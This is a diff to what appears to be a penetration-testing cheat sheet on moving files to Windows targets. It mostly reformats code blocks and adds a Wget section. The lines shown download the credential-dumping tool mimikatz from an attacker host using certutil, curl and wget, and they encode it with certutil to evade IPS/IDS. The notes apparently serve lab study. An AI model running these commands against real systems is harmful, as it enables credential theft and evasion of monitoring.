@@ -23,7 +23,7 @@ On the old Windows version sur as Windows XP, Windows 2000
 ```
 \\ Basic transfert
 certutil.exe -urlcache -split -f http://192.168.119.194:8000/mimikatz.exe output.file
-
+```
 \\ Encoded transfert - Basic IPS/IDS evasion
 ```
 certutil -encode mimikatz.exe mimikatz.txt
@@ -38,6 +38,7 @@ certutil.exe -decode mimikatz.txt mimikatz.exe
 curl http://192.168.119.194:8000/mimikatz.exe --output mimikatz.exe
 ```
 
+#### Wget
+```
 wget -O mimikatz.exe http://192.168.119.194:8000/mimikatz.exe
-
-## Both Methods
+```
